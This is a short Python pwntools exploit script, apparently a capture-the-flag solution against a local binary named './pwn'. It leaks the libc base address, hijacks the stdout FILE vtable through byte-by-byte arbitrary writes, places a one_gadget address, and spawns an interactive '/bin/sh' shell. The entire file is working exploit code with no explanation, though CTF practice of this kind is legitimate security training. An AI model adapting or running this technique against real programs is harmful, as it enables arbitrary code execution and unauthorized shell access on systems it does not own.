#!/usr/bin/env python
# coding=utf-8

from pwn import *
a=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc.so.6")
ld=ELF("/lib64/ld-linux-x86-64.so.2")
context.terminal=["tmux","splitw","-h"]
def write(address,value):
    a.send(p64(address))
    a.send(p8(value))
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000A3C)
    ''')
debug()
a.recvuntil("you can use it ")
libc_base=eval(a.recv(14))-libc.symbols["_IO_2_1_stdout_"]
success("libc_base ==> 0x%x"%libc_base)
vtable=libc_base+libc.symbols["_IO_2_1_stdout_"]+0xd8
fake_vtable=libc_base+0x3c5618-0x58
target=libc_base+0x3c5618
success("target ==> 0x%x"%target)
one_gadget=libc_base+0xf02b0
success("one ==> 0x%x"%one_gadget)

write(vtable,fake_vtable&0xff)
write(vtable+1,(fake_vtable>>8)&0xff)

write(target,one_gadget&0xff)
write(target+1,(one_gadget>>8)&0xff)
write(target+2,(one_gadget>>16)&0xff)

a.sendline("exec /bin/sh 1>&0 ")

a.interactive()

